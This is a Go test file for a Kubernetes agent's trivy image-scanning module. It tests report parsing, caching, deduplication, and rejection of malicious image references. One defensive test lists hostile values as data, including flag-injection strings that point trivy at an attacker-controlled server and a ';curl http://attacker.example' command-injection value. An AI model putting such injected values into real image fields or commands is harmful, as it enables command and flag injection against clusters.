// trivy_test.go tests the trivy JSON parsing, the disk cache and ScanSnapshot orchestration with
// an injected runner — no test here ever executes the real trivy binary.
package trivy

import (
	"context"
	"errors"
	"os"
	"reflect"
	"strings"
	"testing"
	"time"

	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	"github.com/kubegauge/agent/internal/snapshot"
)

func TestParseTrivyJSONCountsAndTopCVEs(t *testing.T) {
	data, err := os.ReadFile("testdata/trivy-image.json")
	if err != nil {
		t.Fatalf("lendo fixture: %v", err)
	}

	res, err := parseTrivyJSON(data)
	if err != nil {
		t.Fatalf("parseTrivyJSON: %v", err)
	}

	if res.Critical != 1 || res.High != 2 || res.Medium != 2 || res.Low != 1 {
		t.Errorf("contagens = C%d H%d M%d L%d, want C1 H2 M2 L1 (UNKNOWN descartada)",
			res.Critical, res.High, res.Medium, res.Low)
	}

	wantIDs := []string{"CVE-2024-0001", "CVE-2023-3333", "CVE-2023-44487", "CVE-2023-0001", "CVE-2023-2222"}
	if len(res.TopCVEs) != len(wantIDs) {
		t.Fatalf("len(TopCVEs) = %d, want %d (limite 5, low cortada)", len(res.TopCVEs), len(wantIDs))
	}
	for i, want := range wantIDs {
		if res.TopCVEs[i].ID != want {
			t.Errorf("TopCVEs[%d].ID = %s, want %s (order: severity, then id)", i, res.TopCVEs[i].ID, want)
		}
	}
	if res.TopCVEs[0].Severity != "critical" || res.TopCVEs[0].FixedVersion != "3.0.13-1" {
		t.Errorf("TopCVEs[0] = %+v, want severity critical / fixedVersion 3.0.13-1", res.TopCVEs[0])
	}
	if res.TopCVEs[3].FixedVersion != "" {
		t.Errorf("a CVE with no FixedVersion must stay empty, got %q", res.TopCVEs[3].FixedVersion)
	}
	if res.ScanError != "" {
		t.Errorf("ScanError = %q, want empty", res.ScanError)
	}
}

func TestParseTrivyJSONInvalid(t *testing.T) {
	if _, err := parseTrivyJSON([]byte("not json")); err == nil {
		t.Error("expected an error for invalid JSON")
	}
}

// fixtureRunner returns the testdata fixture for every image and records each scanned ref.
func fixtureRunner(t *testing.T, calls *[]string) runnerFunc {
	t.Helper()
	data, err := os.ReadFile("testdata/trivy-image.json")
	if err != nil {
		t.Fatalf("lendo fixture: %v", err)
	}
	return func(ctx context.Context, bin string, args ...string) ([]byte, error) {
		if _, ok := ctx.Deadline(); !ok {
			t.Error("runner must receive a context with a deadline (per-image timeout)")
		}
		*calls = append(*calls, args[len(args)-1]) // last arg = image ref
		return data, nil
	}
}

func testScanner(runner runnerFunc, cacheDir string) *Scanner {
	return &Scanner{bin: "trivy", cache: newDiskCache(cacheDir), runner: runner, now: func() time.Time { return cacheNow }}
}

func deployWithImage(ns, name, image string) appsv1.Deployment {
	return appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: ns},
		Spec: appsv1.DeploymentSpec{Template: corev1.PodTemplateSpec{Spec: corev1.PodSpec{
			Containers: []corev1.Container{{Name: "app", Image: image}},
		}}},
	}
}

func TestScanSnapshotDedupesAndSkipsSystemNamespaces(t *testing.T) {
	var calls []string
	s := testScanner(fixtureRunner(t, &calls), t.TempDir())
	snap := &snapshot.Snapshot{Deployments: []appsv1.Deployment{
		deployWithImage("default", "web", "nginx:1.25"),
		deployWithImage("default", "web2", "nginx:1.25"),
		deployWithImage("kube-system", "kube-proxy", "registry.k8s.io/kube-proxy:v1.30.0"),
	}}

	vulns := s.ScanSnapshot(context.Background(), snap)

	if len(calls) != 1 || calls[0] != "nginx:1.25" {
		t.Errorf("calls = %v, want exactly [nginx:1.25] (dedupe + kube-system excluded)", calls)
	}
	if len(vulns.ByRef) != 1 || vulns.ByRef["nginx:1.25"].Critical != 1 {
		t.Errorf("ByRef = %+v, want nginx:1.25 com Critical=1 da fixture", vulns.ByRef)
	}
}

func TestScanSnapshotErrorPerImageIsNotCached(t *testing.T) {
	dir := t.TempDir()
	var calls []string
	fixture := fixtureRunner(t, &calls)
	runner := func(ctx context.Context, bin string, args ...string) ([]byte, error) {
		if args[len(args)-1] == "bad:1.0" {
			return nil, errors.New("manifest unknown")
		}
		return fixture(ctx, bin, args...)
	}
	s := testScanner(runner, dir)
	snap := &snapshot.Snapshot{Deployments: []appsv1.Deployment{
		deployWithImage("default", "ok", "nginx:1.25"),
		deployWithImage("default", "bad", "bad:1.0"),
	}}

	vulns := s.ScanSnapshot(context.Background(), snap)

	if !strings.Contains(vulns.ByRef["bad:1.0"].ScanError, "manifest unknown") {
		t.Errorf("ScanError = %q, want conter 'manifest unknown'", vulns.ByRef["bad:1.0"].ScanError)
	}
	if vulns.ByRef["nginx:1.25"].High != 2 {
		t.Errorf("the healthy image should have been scanned normally, got %+v", vulns.ByRef["nginx:1.25"])
	}
	entries, _ := os.ReadDir(dir)
	if len(entries) != 1 {
		t.Errorf("only the success is cached: expected 1 file, got %d", len(entries))
	}
}

func TestScanSnapshotUsesCacheOnSecondPass(t *testing.T) {
	dir := t.TempDir()
	var calls []string
	s := testScanner(fixtureRunner(t, &calls), dir)
	snap := &snapshot.Snapshot{Deployments: []appsv1.Deployment{deployWithImage("default", "web", "nginx:1.25")}}

	first := s.ScanSnapshot(context.Background(), snap)

	failing := func(ctx context.Context, bin string, args ...string) ([]byte, error) {
		t.Error("the second pass should come 100% from the cache")
		return nil, errors.New("should not run")
	}
	s2 := testScanner(failing, dir)
	second := s2.ScanSnapshot(context.Background(), snap)

	if !reflect.DeepEqual(first.ByRef, second.ByRef) {
		t.Errorf("the cache must reproduce the result: first %+v != second %+v", first.ByRef, second.ByRef)
	}
}

func TestScanSnapshotCacheKeyPrefersDigest(t *testing.T) {
	dir := t.TempDir()
	var calls []string
	s := testScanner(fixtureRunner(t, &calls), dir)
	snap := &snapshot.Snapshot{
		Deployments: []appsv1.Deployment{deployWithImage("default", "web", "nginx:1.25")},
		Pods: []corev1.Pod{{
			ObjectMeta: metav1.ObjectMeta{
				Name: "web-abc", Namespace: "default",
				OwnerReferences: []metav1.OwnerReference{{APIVersion: "apps/v1", Kind: "ReplicaSet", Name: "web-1", UID: "u1"}},
			},
			Status: corev1.PodStatus{ContainerStatuses: []corev1.ContainerStatus{{
				Image: "nginx:1.25", ImageID: "docker.io/library/nginx@sha256:deadbeef",
			}}},
		}},
	}

	s.ScanSnapshot(context.Background(), snap)

	if _, err := os.Stat(s.cache.path("sha256:deadbeef")); err != nil {
		t.Errorf("expected a cache file under the digest key: %v", err)
	}
}

func TestNewScannerNilWhenBinaryMissing(t *testing.T) {
	t.Setenv("PATH", t.TempDir())
	if s := NewScanner(""); s != nil {
		t.Error("with no trivy on PATH, NewScanner must return nil")
	}
}

// TestScanOneRefusesHostileImageRefs: a pod's image field is attacker-controlled for anyone with
// pod-create. Nothing that could be read as a flag (or that is not a reference at all) may reach
// the trivy argument list.
func TestScanOneRefusesHostileImageRefs(t *testing.T) {
	hostile := []string{
		"--server=http://attacker.example/",
		"-q",
		"nginx:1.0 --server=http://attacker.example/",
		"nginx:1.0\n--server=http://attacker.example/",
		"nginx:1.0;curl http://attacker.example",
		"",
		strings.Repeat("a", maxImageRefLen+1),
	}

	for _, ref := range hostile {
		t.Run(ref, func(t *testing.T) {
			executed := false
			s := testScanner(func(context.Context, string, ...string) ([]byte, error) {
				executed = true
				return nil, nil
			}, "")

			res := s.scanOne(context.Background(), ref)
			if executed {
				t.Errorf("scanOne executed trivy for hostile reference %q", ref)
			}
			if res.ScanError == "" {
				t.Errorf("scanOne(%q) reported no ScanError", ref)
			}
		})
	}
}

// TestScanOnePassesEndOfFlagsSeparator: the "--" is the second half of the defense, so it stays
// even for references that pass validation.
func TestScanOnePassesEndOfFlagsSeparator(t *testing.T) {
	var got []string
	s := testScanner(func(_ context.Context, _ string, args ...string) ([]byte, error) {
		got = args
		return []byte(`{"Results":[]}`), nil
	}, "")

	s.scanOne(context.Background(), "ghcr.io/kubegauge/agent:v0.16.0")

	if len(got) < 2 || got[len(got)-2] != "--" {
		t.Errorf("trivy args = %v, want the image reference preceded by \"--\"", got)
	}
}

// TestValidateImageRefAcceptsRealReferences guards against the pattern being tightened into
// something that rejects references clusters really run.
func TestValidateImageRefAcceptsRealReferences(t *testing.T) {
	valid := []string{
		"nginx",
		"nginx:1.25.3",
		"library/nginx:latest",
		"ghcr.io/kubegauge/agent:v0.16.0",
		"registry.example.com:5000/team/app:1.0",
		"gcr.io/distroless/static-debian12@sha256:6d1e0f8b1c1b0b7f7a3f2a1e0c9d8b7a6f5e4d3c2b1a0987654321fedcba9876",
		"quay.io/prometheus/node-exporter:v1.8.2",
	}
	for _, ref := range valid {
		if err := validateImageRef(ref); err != nil {
			t.Errorf("validateImageRef(%q) = %v, want nil", ref, err)
		}
	}
}
